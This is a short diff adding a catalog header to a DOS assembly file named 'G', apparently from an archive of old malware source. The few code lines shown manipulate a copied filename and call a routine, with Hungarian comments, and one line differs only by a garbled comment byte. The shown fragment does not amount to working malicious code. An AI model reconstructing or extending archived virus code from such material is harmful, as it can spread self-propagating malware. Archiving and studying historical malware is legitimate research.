@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      G
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 CODE     segment para  public 'code'
          assume  cs:code,ds:code,es:nothing,ss:nothing
 
@@ -149,7 +160,7 @@ juk1:           mov cs:kkk,ax
                 push ds
                 pop es
                 mov bx,cs:kbx
-                mov byte ptr [bx+1],'A'  ;�
+                mov byte ptr [bx+1],'A'  ;�
                 call elorutin
                 push cs
                 pop ds              ;DS:DX a masolt nev.
